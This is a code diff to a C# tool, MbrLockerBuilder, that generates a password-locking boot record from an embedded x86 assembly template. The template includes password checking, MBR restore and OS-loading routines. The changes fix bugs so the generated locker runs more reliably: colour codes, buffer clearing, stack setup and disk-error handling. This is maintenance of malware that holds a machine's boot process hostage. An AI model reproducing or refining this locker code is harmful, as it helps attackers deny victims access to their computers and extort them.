@@ -305,8 +305,8 @@ namespace MbrLockerBuilder
                     case 9: fgColor = Color.LightBlue; break;
                     case 10: fgColor = Color.LightGreen; break;
                     case 11: fgColor = Color.LightCyan; break;
-                    case 12: fgColor = Color.LightRed; break;
-                    case 13: fgColor = Color.LightMagenta; break;
+                    case 12: fgColor = Color.OrangeRed; break;
+                    case 13: fgColor = Color.DeepPink; break;
                     case 14: fgColor = Color.Yellow; break;
                     case 15: fgColor = Color.White; break;
                 }
@@ -681,10 +681,11 @@ start:
     mov bx, 0x1000
     mov cx, 256
     mov dx, 0
+    push ax
     mov ax, 0x0000
     mov es, ax
     mov bp, 0x1000
-    mov ax, 0x1100
+    pop ax
     int 0x10
 
     mov ax, 0x0000
@@ -727,6 +728,11 @@ start:
     call print
 
 password_loop:
+    mov di, buffer
+    mov cx, 64
+    xor al, al
+    rep stosb
+
     call get_password
     call check_password
     cmp byte [password_ok], 1
@@ -774,6 +780,10 @@ restore_mbr:
     ret
 
 load_os:
+    cli
+    mov sp, 0x6000
+    sti
+
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x7C00
@@ -784,6 +794,8 @@ load_os:
     mov dh, 0
     mov dl, 0x80
     int 0x13
+    jc load_error
+
     jmp 0x0000:0x7C00
 
 print:
@@ -823,6 +835,7 @@ get_password:
     cmp di, buffer
     je .loop
     dec di
+    mov byte [di], 0
     mov ah, 0x0E
     mov bh, 0
     mov bl, 0x07
@@ -908,9 +921,9 @@ dw 0xAA55";
             template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
 
             // ============================================================
-            // ЗАМЕНА ЦВЕТОВ (ИЗ РАСШИРЕННОГО СПИСКА)
+            // ЗАМЕНА ЦВЕТОВ (ДЛЯ ASM)
             // ============================================================
-            string textColor = "0F"; // White (по умолчанию)
+            string textColor = "0F"; // White
             switch (this.cmbTextColor.SelectedIndex)
             {
                 case 0: textColor = "00"; break; // Black
@@ -925,13 +938,13 @@ dw 0xAA55";
                 case 9: textColor = "09"; break; // Light Blue
                 case 10: textColor = "0A"; break; // Light Green
                 case 11: textColor = "0B"; break; // Light Cyan
-                case 12: fgColor = Color.OrangeRed; break;
-                case 13: fgColor = Color.DeepPink; break;      // Li
+                case 12: textColor = "0C"; break; // Light Red
+                case 13: textColor = "0D"; break; // Light Magenta
                 case 14: textColor = "0E"; break; // Yellow
                 case 15: textColor = "0F"; break; // White
             }
 
-            string bgColor = "00"; // Black (по умолчанию)
+            string bgColor = "00";
             switch (this.cmbBgColor.SelectedIndex)
             {
                 case 0: bgColor = "00"; break; // Black
@@ -944,7 +957,6 @@ dw 0xAA55";
                 case 7: bgColor = "70"; break; // Light Gray
             }
 
-            // Комбинированный цвет (фон + текст)
             string combinedColor = bgColor + textColor;
 
             template = template.Replace("mov bh, 0x07", "mov bh, 0x" + combinedColor);
